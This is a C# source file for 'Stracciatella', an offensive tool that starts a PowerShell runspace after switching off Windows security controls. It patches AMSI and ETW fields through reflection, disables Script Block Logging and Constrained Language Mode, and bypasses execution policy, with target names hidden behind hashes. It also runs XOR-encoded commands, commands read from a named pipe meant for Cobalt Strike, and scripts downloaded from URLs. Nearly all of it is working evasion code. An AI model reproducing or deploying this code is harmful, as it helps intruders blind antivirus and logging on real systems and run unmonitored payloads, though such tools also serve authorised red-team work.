using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.IO;
using System.Linq;
using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Globalization;
using System.Reflection;
using System.Threading;
using System.Collections.Generic;
using System.IO.Pipes;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Collections;

namespace Stracciatella
{
    class Stracciatella
    {
        private static string GLOBAL_PROMPT_PREFIX = "Stracciatella";

        private static bool CleanupNeeded = false;

        internal class Options
        {
            public string[] ValidOptions = {
                "-v", "--verbose",
                "-f", "--force",
                "-c", "--command",
                "-x", "--xor",
                "-e", "--cmdalsoencoded",
                "-n", "--nocleanup",
                "-C", "--leaveclm",
                "-p", "--pipe",
                "-t", "--timeout",
            };

            public bool Verbose { get; set; }
            public bool DontDisableClm { get; set; }
            public string Command { get; set; }
            public string PipeName { get; set; }
            public uint Timeout { get; set; }
            public Byte XorKey { get; set; }
            public bool Force { get; set; }
            public bool Nocleanup { get; set; }
            public string ScriptPath { get; set; }
            public bool Parashell { get; set; }
            public bool CmdEncoded { get; set; }

            public Options()
            {
                Verbose = false;
                DontDisableClm = false;
                Force = false;
                XorKey = 0;
                Command = "";
                Nocleanup = false;
                ScriptPath = "";
                Parashell = false;
                CmdEncoded = false;
                PipeName = "";
                Timeout = 60000;
            }
        }

        private static Options ProgramOptions;

        private static void PrintBanner()
        {
            Console.WriteLine("");
            Console.WriteLine("  :: Stracciatella - Powershell runspace with AMSI, ETW and Script Block Logging disabled.");
            Console.WriteLine("  Mariusz Banach / mgeeky, '19-22 <mb@binary-offensive.com>");
            Console.WriteLine("  v0.7");
            Console.WriteLine("");
        }

        private static void Usage()
        {
            PrintBanner();
            Console.WriteLine("Usage: stracciatella.exe [options] [command]");
            Console.WriteLine("  -s <path>, --script <path> - Path to file containing Powershell script to execute. If not options given, will enter");
            Console.WriteLine("                               a pseudo-shell loop. This can be also a HTTP(S) URL to download & execute powershell script.");
            Console.WriteLine("  -v, --verbose              - Prints verbose informations");
            Console.WriteLine("  -n, --nocleanup            - Don't remove CLM disable leftovers (DLL files in TEMP and COM registry keys).");
            Console.WriteLine("                               By default these are going to be always removed. ");
            Console.WriteLine("  -C, --leaveclm             - Don't attempt to disable CLM. Stealthier. Will avoid leaving CLM disable artefacts undeleted.");
            Console.WriteLine("  -f, --force                - Proceed with execution even if Powershell defenses were not disabled.");
            Console.WriteLine("                               By default we bail out on failure.");
            Console.WriteLine("  -c, --command              - Executes the specified commands You can either use -c or append commands after");
            Console.WriteLine("                               stracciatella parameters: cmd> straciatella ipconfig /all");
            Console.WriteLine("                               If command and script parameters were given, executes command after running script.");
            Console.WriteLine("  -x <key>, --xor <key>      - Consider input as XOR encoded, where <key> is a one byte key in decimal");
            Console.WriteLine("                               (prefix with 0x for hex)");
            Console.WriteLine("  -p <name>, --pipe <name>   - Read powershell commands from a specified named pipe. Command must be preceded with 4 bytes of");
            Console.WriteLine("                               its length coded in little-endian (Length-Value notation).");
            Console.WriteLine("  -t <millisecs>, --timeout <millisecs>   ");
            Console.WriteLine("                             - Specifies timeout for pipe read operation (in milliseconds). Default: 60 secs. 0 - infinite.");
            Console.WriteLine("  -e, --cmdalsoencoded       - Consider input command (specified in '--command') encoded as well.");
            Console.WriteLine("                               Decodes input command after decoding and running input script file. ");
            Console.WriteLine("                               By default we only decode input file and consider command given in plaintext");
        }

        private static Options ParseOptions(string[] args)
        {
            var options = new Options();

            if (args.Length < 1)
            {
                options.Parashell = true;
                return options;
            }

            int i = 0;
            int processedopts = 0;
            HashSet<string> processed = new HashSet<string>();

            for(; i < args.Length; i++)
            {
                string arg = args[i];
                if(string.Equals(arg, "-v") || string.Equals(arg, "--verbose"))
                {
                    options.Verbose = true;
                    processed.Add(arg);
                    processedopts += 1;
                }
                else if (string.Equals(arg, "-e") || string.Equals(arg, "--cmdencoded"))
                {
                    options.CmdEncoded = true;
                    processed.Add(arg);
                    processedopts += 1;
                }
                else if (string.Equals(arg, "-C") || string.Equals(arg, "--leaveclm"))
                {
                    options.DontDisableClm = true;
                    processed.Add(arg);
                    processedopts += 1;
                }
                else if (string.Equals(arg, "-f") || string.Equals(arg, "--force"))
                {
                    options.Force = true;
                    processed.Add(arg);
                    processedopts += 1;
                }
                else if (string.Equals(arg, "-n") || string.Equals(arg, "--nocleanup"))
                {
                    options.Nocleanup = true;
                    processed.Add(arg);
                    processedopts += 1;
                }
                else if (string.Equals(arg, "-c") || string.Equals(arg, "--command"))
                {
                    if(args.Length - 1 < i + 1)
                    {
                        throw new ArgumentException("No value for Command argument.");
                    }

                    options.Command = args[i+1];
                    processed.Add(arg);
                    processed.Add(args[i + 1]);
                    processedopts += 2;
                    i += 1;
                }
                else if (string.Equals(arg, "-t") || string.Equals(arg, "--timeout"))
                {
                    if (args.Length - 1 < i + 1)
                    {
                        throw new ArgumentException("No value for Timeout argument.");
                    }

                    options.Timeout = UInt32.Parse(args[i + 1]);
                    processed.Add(arg);
                    processed.Add(args[i + 1]);
                    processedopts += 2;
                    i += 1;
                }
                else if (string.Equals(arg, "-x") || string.Equals(arg, "--xor"))
                {
                    if (args.Length - 1 < i + 1)
                    {
                        throw new ArgumentException("No value for XorKey argument.");
                    }

                    string n = args[i + 1];

                    if (n.StartsWith("0x"))
                    {
                        options.XorKey = Byte.Parse(n.Substring(2), NumberStyles.HexNumber);
                    }
                    else
                    {
                        options.XorKey = Byte.Parse(n);
                    }

                    processed.Add(arg);
                    processed.Add(args[i + 1]);
                    processedopts += 2;
                    i += 1;
                }
                else if (string.Equals(arg, "-p") || string.Equals(arg, "--pipe"))
                {
                    if (args.Length - 1 < i + 1)
                    {
                        throw new ArgumentException("No value for pipe argument.");
                    }

                    options.PipeName = args[i + 1];

                    processed.Add(arg);
                    processed.Add(args[i + 1]);
                    processedopts += 2;
                    i += 1;
                }
                else if (string.Equals(arg, "-s") || string.Equals(arg, "--script"))
                {
                    if (args.Length - 1 < i + 1)
                    {
                        throw new ArgumentException("No value for Script argument.");
                    }

                    string p = args[i + 1];
                    processedopts += 2;
                    options.ScriptPath = p;
                    processed.Add(arg);
                    processed.Add(args[i + 1]);
                    i += 1;
                }
                else if (string.Equals(arg, "-l") || string.Equals(arg, "--label"))
                {
                    //
                    // Undocumented parameter "label".
                    // Used only to satisfy BOF.NET bofnet_jobs output displaying executed assembly's Args.
                    // Not to be used directly. Does nothing.
                    //

                    if (args.Length - 1 < i + 1)
                    {
                        throw new ArgumentException("No value for label.");
                    }

                    processed.Add(arg);
                    processed.Add(args[i + 1]);
                    processedopts += 2;
                    i += 1;
                }
            }

            if (processedopts < args.Length )
            {
                var remainderArgs = args.Skip(processedopts).Take(args.Length - processedopts).ToArray();

                options.Command = String.Join(" ", remainderArgs);
            }

            if (options.Command.Length == 0)
            {
                options.Parashell = true;
            }
            else if (options.Command.Length > 0)
            {

            }
            else
            {
                throw new ArgumentException("You must either specify command or path to a script to execute.");
            }

            if(options.XorKey != 0)
            {
                if(options.Command.Length == 0 && options.ScriptPath.Length == 0 && options.PipeName.Length == 0)
                {
                    throw new ArgumentException("Specifying XorKey option makes no sense if no command, script path nor pipename were given.");
                }
            }

            return options;
        }

        public static void Info(string fmt)
        {
            if(ProgramOptions.Verbose)
            {
                Console.WriteLine(fmt);
            }
        }

        private static ulong GetHash(string data)
        {
            ulong val = 5381;
            data = data.ToLower();
            foreach(char b in data)
            {
                UInt32 n = (UInt32)((val << 5) & 0xffffffff);
                val = (n + val) + b;
            }

            return val;
        }

        private static bool DisableDefenses(PowerShell rs, CustomPSHost host)
        {
            bool ret = true;

            string l = ExecuteCommand("'{0}.{1}' -f $PSVersionTable.PSVersion.Major, $PSVersionTable.PSVersion.Minor", rs, host, true, true).Trim();
            float psversion = 5;
            try
            {
                System.Globalization.CultureInfo customCulture = (System.Globalization.CultureInfo)System.Threading.Thread.CurrentThread.CurrentCulture.Clone();
                customCulture.NumberFormat.NumberDecimalSeparator = ".";

                System.Threading.Thread.CurrentThread.CurrentCulture = customCulture;
                psversion = float.Parse(l, System.Globalization.CultureInfo.InvariantCulture);
            }
            catch (FormatException e)
            {
                Info($"[-] Could not obtain Powershell's version. Assuming 5.0 (exception: {e}");
            }

            if (psversion < 5.0 && !ProgramOptions.Force)
            {
                Info("[+] Powershell version is below 5, so AMSI, CLM, SBL are not available anyway :-)");
                Info("Skipping bypass procedures...");
                return ret;
            }
            else
            {
                Info($"[.] Powershell's version: {psversion}");
            }

            l = ExecuteCommand("$ExecutionContext.SessionState.LanguageMode", rs, host, true, true).Trim();
            Info($"[.] Language Mode: {l}");

            if (!String.Equals(l, "FullLanguage", StringComparison.CurrentCultureIgnoreCase))
            {
                if (!ProgramOptions.DontDisableClm) DisableClm.DoDisable(rs, host, ProgramOptions.Verbose);
                else Info("[-] Constrained Language Mode enabled: couldn't disable as explicitly told me not to do so.");

                CleanupNeeded = true;

                l = ExecuteCommand("$ExecutionContext.SessionState.LanguageMode", rs, host, true, true).Trim();
                Info($"[.] Language Mode after attempting to disable CLM: {l}");

                if (String.Equals(l, "FullLanguage", StringComparison.CurrentCultureIgnoreCase))
                {
                    Info("[+] Constrained Language Mode Disabled.");
                    ret &= true;
                }
                else
                {
                    Info("[-] Constrained Language Mode not disabled.");
                    ret &= false;
                }
            }
            else
            {
                Info("[+] No need to disable Constrained Language Mode. Already in FullLanguage.");
            }

            if ((ret &= DisableScriptLogging(rs)))
            {
                Info("[+] Script Block Logging Disabled.");
            }
            else
            {
                Info("[-] Script Block Logging not disabled.");
            }

            if ((ret &= DisableAmsi(rs)))
            {
                Info("[+] AMSI Disabled.");
            }
            else
            {
                Info("[-] AMSI not disabled.");
            }

            if ((ret &= DisableETW(rs)))
            {
                Info("[+] ETW Disabled.");
            }
            else
            {
                Info("[-] ETW not disabled.");
            }

            Info("");

            return ret;
        }

        public static bool DisableAmsi(PowerShell rs)
        {
            bool ret = false;
            ret |= DisableAmsiTechnique1(rs);
            ret |= DisableAmsiTechnique2(rs);
            return ret;
        }

        public static bool DisableAmsiTechnique1(PowerShell rs)
        {
            AppDomain currentDomain = AppDomain.CurrentDomain;
            Assembly[] assems = currentDomain.GetAssemblies();

            foreach (Assembly assem in assems)
            {
                if(assem.GlobalAssemblyCache && GetHash(assem.Location.Split('\\').Last()) == 65764965518) // SysXtem.ManaXgement.AutomaXtion.dll
                {
                    Type[] types = assem.GetTypes();
                    foreach (var tp in types)
                    {
                        if(GetHash(tp.Name) == 13944524928) // AmsiUXtils
                        {
                            var fields = tp.GetFields(BindingFlags.NonPublic|BindingFlags.Static);
                            foreach (var f in fields)
                            {
                                if (GetHash(f.Name) == 27628075080) // amsiInXitFaXiled
                                {
                                    f.SetValue(null, true);
                                    return (bool)f.GetValue(null);
                                }
                            }
                        }
                    }
                }
            }

            return false;
        }

        public static bool DisableAmsiTechnique2(PowerShell rs)
        {
            AppDomain currentDomain = AppDomain.CurrentDomain;
            Assembly[] assems = currentDomain.GetAssemblies();

            foreach (Assembly assem in assems)
            {
                if (assem.GlobalAssemblyCache && GetHash(assem.Location.Split('\\').Last()) == 65764965518) // SysXtem.ManaXgement.AutomaXtion.dll
                {
                    Type[] types = assem.GetTypes();
                    foreach (var tp in types)
                    {
                        if (GetHash(tp.Name) == 13944524928) // AmsiUXtils
                        {
                            var fields = tp.GetFields(BindingFlags.NonPublic | BindingFlags.Static);
                            foreach (var f in fields)
                            {
                                if (GetHash(f.Name) == 21195228531) // amsiSesXsion
                                {
                                    f.SetValue(null, null);
                                }
                                else if (GetHash(f.Name) == 18097066420) // amsiConXtext
                                {
                                    IntPtr hglobal = Marshal.AllocHGlobal(9077);
                                    f.SetValue(null, hglobal);
                                }
                            }
                        }
                    }
                }
            }

            return false;
        }

        public static bool DisableETW(PowerShell rs)
        {
            // Based on https://gist.githubusercontent.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32/raw/115d0c513d041243a06a764546fd57e7c2f5e47e/KillETW.ps1
            try
            {
                AppDomain currentDomain = AppDomain.CurrentDomain;
                Assembly[] assems = currentDomain.GetAssemblies();

                object prov = null;

                foreach (Assembly assem in assems)
                {
                    var s = assem.Location.Split('\\').Last();
                    var h = GetHash(s);

                    if (assem.GlobalAssemblyCache && GetHash(assem.Location.Split('\\').Last()) == 65764965518) // System.ManaXgement.Automation
                    {
                        Type[] types = assem.GetTypes();
                        foreach (var tp in types)
                        {
                            if (GetHash(tp.Name) == 21880115877) // PSEtwLXogProvider
                            {
                                var fields = tp.GetFields(BindingFlags.NonPublic | BindingFlags.Static);
                                foreach (var f in fields)
                                {
                                    if (GetHash(f.Name) == 13746501952) // etwPXrovider
                                    {
                                        prov = f.GetValue(null);
                                        break;
                                    }
                                }
                            }

                            if (prov != null) break;
                        }
                    }

                    if (prov != null) break;
                }

                if (prov == null) return false;

                foreach (Assembly assem in assems)
                {
                    if (assem.GlobalAssemblyCache && GetHash(assem.Location.Split('\\').Last()) == 29479554155) // SystXem.Core.dll
                    {
                        Type[] types = assem.GetTypes();
                        foreach (var tp in types)
                        {
                            if (GetHash(tp.Name) == 26304812882) // EventPrXovider
                            {
                                var fields = tp.GetFields(BindingFlags.NonPublic | BindingFlags.Instance);
                                foreach (var f in fields)
                                {
                                    if (GetHash(f.Name) == 15534322620) // m_enXabled
                                    {
                                        f.SetValue(prov, null);
                                        return true;
                                    }
                                }
                            }
                        }
                    }
                }

                return false;
            }
            catch (Exception e)
            {
                Console.WriteLine($"[!] Could not disable ETW. Unhandled exception occured:\n{e}");
                return false;
            }
        }

        public static bool DisableScriptLogging(PowerShell rs)
        {
            try
            {
                bool ret = false;
                ret |= DisableScriptLoggingTechnique1(rs);
                return ret;
            }
            catch (Exception e)
            {
                Console.WriteLine($"[!] Could not disable Script Block Logging. Unhandled exception occured:\n{e}");
                return false;
            }
        }


        public static bool DisableScriptLoggingTechnique1(PowerShell rs)
        {
            AppDomain currentDomain = AppDomain.CurrentDomain;
            Assembly[] assems = currentDomain.GetAssemblies();

            foreach (Assembly assem in assems)
            {
                if (assem.GlobalAssemblyCache && GetHash(assem.Location.Split('\\').Last()) == 65764965518) // SysXtem.ManaXgement.AutomaXtion.dll
                {
                    Type[] types = assem.GetTypes();
                    string key = "";
                    string param = "";

                    foreach (var tp in types)
                    {
                        // 12579468197 - ScriXptBloXck
                        if (GetHash(tp.Name) == 4572158998) // UXtils
                        {
                            var fields = tp.GetFields(BindingFlags.NonPublic | BindingFlags.Static);
                            FieldInfo field = null;
                            foreach (var f in fields)
                            {
                                if (GetHash(f.Name) == 52485150955) // cachXedGrXoupPoXlicySetXtings
                                {
                                    var cached = (System.Collections.Concurrent.ConcurrentDictionary<string, System.Collections.Generic.Dictionary<string, object>>)f.GetValue(null);

                                    foreach (string n in cached.Keys)
                                    {
                                        string val = n;
                                        if (val.Contains("\\"))
                                        {
                                            var pos = val.LastIndexOf("\\");
                                            if (pos > 0 && pos + 1 < val.Length)
                                            {
                                                val = val.Substring(pos + 1);
                                            }
                                        }

                                        if (GetHash(val) == 32086076268) // ScrXiptBloXckLogXging
                                        {
                                            param = val;
                                            key = n;

                                            if (key.Length > 0 && cached[key] != null)
                                            {
                                                var cached2 = new System.Collections.Generic.Dictionary<string, object>();

                                                cached2[$"Enable{param}"] = 0;
                                                cached2[$"Enable{param.Replace("kL", "kInvocationL")}"] = 0;

                                                cached[key] = cached2;

                                                f.SetValue(null, cached);
                                            }

                                            return true;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }

            return false;
        }

        private static string Execute(string scriptPath, string command)
        {
            string output = "";
            CustomPSHost host = new CustomPSHost();
            var state = InitialSessionState.CreateDefault();

            state.ApartmentState = System.Threading.ApartmentState.STA;
            state.AuthorizationManager = null;                  // Bypasses PowerShell execution policy
            state.ThreadOptions = PSThreadOptions.UseCurrentThread;

            using (Runspace runspace = RunspaceFactory.CreateRunspace(host, state))
            {
                runspace.ApartmentState = System.Threading.ApartmentState.STA;
                runspace.ThreadOptions = PSThreadOptions.UseCurrentThread;

                runspace.Open();

                using (var ps = PowerShell.Create())
                {
                    ps.Runspace = runspace;
                    if (!DisableDefenses(ps, host))
                    {
                        Info("[-] Could not disable all of the Powershell defenses.");
                        if (!ProgramOptions.Force)
                        {
                            Info("[-] Bailing out...");
                        }
                    }

                    if (scriptPath.Length > 0)
                    {
                        bool success = true;
                        string scriptContents = "";
                        bool silent = false;

                        try
                        {
                            if (scriptPath.StartsWith("http://") || scriptPath.StartsWith("https://"))
                            {
                                using (var wc = new System.Net.WebClient())
                                {
                                    scriptContents = wc.DownloadString(scriptPath);
                                }

                                silent = true;
                                Info($"Executing downloaded script file: {scriptPath}");
                            }
                            else
                            {
                                if (!File.Exists(scriptPath))
                                {
                                    throw new Exception($"Script file does not exist.Will not load it: '{scriptPath}'");
                                }

                                scriptContents = GetFileContents(scriptPath);
                                Info($"PS> . '{scriptPath}'");
                            }
                        }
                        catch (Exception e)
                        {
                            Info($"Could not fetch script file/URL contents. Exception: {e}");
                            success = false;
                        }

                        if (success && scriptContents.Length > 0)
                        {
                            output += ExecuteCommand(scriptContents, ps, host, false, silent, false);
                        }

                        scriptContents = "";
                        scriptPath = "";
                        ProgramOptions.ScriptPath = "";
                    }

                    output += ExecuteCommand(command, ps, host, !ProgramOptions.CmdEncoded);
                    command = "";

                    if (!ProgramOptions.Nocleanup && CleanupNeeded) DisableClm.Cleanup(ps, host, ProgramOptions.Verbose);
                    System.GC.Collect();
                }

                runspace.Close();
            }

            return output.Trim();
        }

        public static string ExecuteCommand(string command, PowerShell rs, CustomPSHost host, bool dontDecode = false, bool silent = false, bool addOutDefault = true)
        {
            string output = "";
            if (command != null && command.Length > 0)
            {
                using (Pipeline pipe = rs.Runspace.CreatePipeline())
                {
                    if (!dontDecode)
                    {
                        try
                        {
                            if (ProgramOptions.XorKey != 0)
                            {
                                command = Decoder.XorDecode(Decoder.Base64DecodeBinary(command), ProgramOptions.XorKey);
                            }
                        }
                        catch (Exception e)
                        {
                            if (!silent) Info($"[-] Could not decode command: {e.Message.ToString()}");
                        }
                    }

                    if(!silent) Info($"PS> {command}");

                    if (command.Length == 0)
                    {
                        if(!silent) Info($"(no command given)");
                        return "";
                    }

                    //pipe.Commands.AddScript("& { " + command + "} *>&1");
                    pipe.Commands.AddScript(command);
                    pipe.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);
                    if(addOutDefault) pipe.Commands.Add("Out-default");

                    try
                    {
                        pipe.Invoke();

                        output = ((CustomPSHostUserInterface)host.UI).Output;
                        ((CustomPSHostUserInterface)host.UI)._sb = new StringBuilder();

                        command = "";
                    }
                    catch (Exception e)
                    {
                        if (!silent) Console.WriteLine(e.ToString());
                    }
                }
            }

            return output;
        }

        // string Join(this IEnumerable<string> strings, string delimiter)
        // was not introduced until 4.0. So provide our own.
#if !NETFX_40 && NETFX_35
        public static string Join(string delimiter, IEnumerable<string> strings)
        {
            return string.Join(delimiter, strings.ToArray());
        }
#endif

        private static string Input(string prompt)
        {
            List<string> input = new List<string>();
            
            string line;
            Console.Write(prompt);
            while ((line = Console.ReadLine()) != null && line != "")
            {
                input.Add(line.Trim());

                // FIXME: Break after first line;
                break;
            }

#if !NETFX_40 && NETFX_35
            return Join("\r\n", input);
#else
            return String.Join("\r\n", input);
#endif
        }

        private static void Parashell()
        {
            CustomPSHost host = new CustomPSHost();
            var state = InitialSessionState.CreateDefault();
            state.AuthorizationManager = null;                  // Bypasses PowerShell execution policy

            using (Runspace runspace = RunspaceFactory.CreateRunspace(host, state))
            {
                runspace.Open();

                using (var ps = PowerShell.Create())
                {
                    ps.Runspace = runspace;
                    if (!DisableDefenses(ps, host))
                    {
                        Info("[-] Could not disable all of the Powershell defenses.");
                        if (!ProgramOptions.Force)
                        {
                            Info("[-] Bailing out...");
                            return;
                        }
                    }

                    string input;
                    while(true)
                    {
                        string pwd = ExecuteCommand("(Resolve-Path .\\).Path", ps, host, true, true).Trim();
                        string prompt = $"{GLOBAL_PROMPT_PREFIX} {pwd}> ";
                        input = Input(prompt);

                        string output = ExecuteCommand(input, ps, host, true);
                        Console.WriteLine(output);

                        if (input == null || input.Length == 0
                            || String.Equals(input, "exit", StringComparison.CurrentCultureIgnoreCase)
                            || String.Equals(input, "quit", StringComparison.CurrentCultureIgnoreCase))
                        {
                            break;
                        }

                        input = "";
                    }

                    if(!ProgramOptions.Nocleanup && CleanupNeeded) DisableClm.Cleanup(ps, host, ProgramOptions.Verbose);
                }

                runspace.Close();
            }
        }

        private static string GetFileContents(string scriptPath)
        {
            string buf = "";
            try
            {
                buf = File.ReadAllText(scriptPath);
            }
            catch (Exception e)
            {
                Info($"[-] Could not open file: {e.Message}");
            }
            return buf;
        }

        // Creates a PipeSecurity that allows users read/write access
        // Source: https://stackoverflow.com/a/51559281
        private static PipeSecurity CreateSystemIOPipeSecurity()
        {
            PipeSecurity pipeSecurity = new PipeSecurity();
            var worldSid = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
            var authenticatedSid = new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null);
            var systemSid = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
            var adminsSid = new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null);
            
            pipeSecurity.AddAccessRule(new PipeAccessRule(systemSid, PipeAccessRights.FullControl, AccessControlType.Allow));
            pipeSecurity.AddAccessRule(new PipeAccessRule(adminsSid, PipeAccessRights.FullControl, AccessControlType.Allow));

            // Allow Everyone read and write access to the pipe. 
            pipeSecurity.AddAccessRule(new PipeAccessRule(worldSid, PipeAccessRights.ReadWrite, AccessControlType.Allow));
            pipeSecurity.AddAccessRule(new PipeAccessRule(authenticatedSid, PipeAccessRights.ReadWrite, AccessControlType.Allow));

            return pipeSecurity;
        }

        private static string ReadFromPipe(string pipeName)
        {
            string data = "";
            uint bytesRead = 0;

            try
            {
                PipeSecurity pipeSecurity = CreateSystemIOPipeSecurity();
                var server = new NamedPipeServerStream(
                    pipeName,
                    PipeDirection.InOut,
                    1,
                    PipeTransmissionMode.Message,
                    PipeOptions.Asynchronous,
                    0x4000,
                    0x400,
                    pipeSecurity,
                    //null,
                    HandleInheritability.Inheritable);

                server.WaitForConnection();
                StreamReader reader = new StreamReader(server);

                byte[] chars = new byte[4];

                while (true)
                {
                    bool skip = false;

                    // CobaltStrike's command builder prepends message with 4 bytes of its length.
                    // we gotta read those 4 bytes first, then fetch the rest of the message.
                    for (int i = 0; i < 4; i++)
                    {
                        if( reader.Peek() != -1)
                        {
                            chars[i] = (byte)reader.Read();
                            bytesRead++;
                        }
                        else
                        {
                            skip = true;
                        }
                    }

                    if (skip) continue;

                    uint expectedLen = BitConverter.ToUInt32(chars, 0);
                    string input = reader.ReadLine();

                    if (String.IsNullOrEmpty(input)) break;

                    data += input;
                    bytesRead += (uint)input.Length;
                    //if (bytesRead >= expectedLen) break;
                    break;
                }
            }
            catch (Exception e)
            {
                Info($"[-] Could not read from pipe: {e.Message}");
            }

            return data;
        }
        private static string ReceiveCommandsFromPipe(string pipeName, uint timeout)
        {
            string result = null;
            Thread thread = new System.Threading.Thread(() =>
            {
                result = ReadFromPipe(pipeName);
            });

            thread.Start();
            if (timeout == 0)
            {
                Info($"[.] Will wait infinitely long for data to read from pipe.");
                thread.Join();
            }
            else
            {
                Info($"[.] Will wait {timeout} milliseconds for data to read from pipe.");
                thread.Join((int)timeout);
            }
            thread.Interrupt();

            if (result != null)
            {
                Info($"[.] Read from pipe ({result.Length} bytes).");
                return result;
            }
            return "";
        }

        static void Main(string[] args)
        {
            if ((args.Length >= 1) && (String.Equals(args[0], "--help", StringComparison.CurrentCultureIgnoreCase)
                || String.Equals(args[0], "/h", StringComparison.CurrentCultureIgnoreCase)
                || String.Equals(args[0], "/?", StringComparison.CurrentCultureIgnoreCase)
                || String.Equals(args[0], "-h", StringComparison.CurrentCultureIgnoreCase)))
            {
                Usage();
                return;
            }

            try
            {
                ProgramOptions = ParseOptions(args);
            }
            catch(ArgumentException e)
            {
                Console.WriteLine($"[-] Cannot parse arguments: {e.Message.ToString()}");
                Usage();
                return;
            }

            if (ProgramOptions.Verbose)
            {
                PrintBanner();
            }

            if (ProgramOptions.ScriptPath.Length > 0)
            {
                Info($"[.] Will load script file: '{ProgramOptions.ScriptPath}'");
            }
            else if(ProgramOptions.PipeName.Length > 0)
            {
                Info($"[.] Receiving input commands from a named pipe: \\\\.\\pipe\\{ProgramOptions.PipeName} ...");
                ProgramOptions.Command = ReceiveCommandsFromPipe(ProgramOptions.PipeName, ProgramOptions.Timeout);

                if(ProgramOptions.Command.Length == 0)
                {
                    Console.WriteLine("No bytes were received from a named pipe.");
                    return;
                }

                ProgramOptions.Parashell = false;
            }

            if (ProgramOptions.XorKey != 0) Info($"[.] Using decoding key: {ProgramOptions.XorKey}");

            try
            {
                AppDomain dom = AppDomain.CreateDomain("sandbox");
                if (ProgramOptions.Parashell)
                {
                    Console.CancelKeyPress += (object sender, ConsoleCancelEventArgs e) =>
                    {
                        if (e.SpecialKey == ConsoleSpecialKey.ControlC)
                        {
                            e.Cancel = true;
                            Console.WriteLine("^C");
                        }
                    };

                    Parashell();
                }
                else
                {
                    string output = Execute(ProgramOptions.ScriptPath, ProgramOptions.Command);
                    if (output.Length > 0)
                    {
                        Console.WriteLine("\n" + output);
                    }
                }

                GC.Collect();
                GC.WaitForPendingFinalizers();
                GC.Collect();

                if (!ProgramOptions.Nocleanup && CleanupNeeded) DisableClm.Cleanup(null, null, ProgramOptions.Verbose);
            }
            catch(Exception e)
            {
                Console.WriteLine($"[!] That's embarassing. Unhandled exception occured:\n{e}");
            }
        }
    }
}
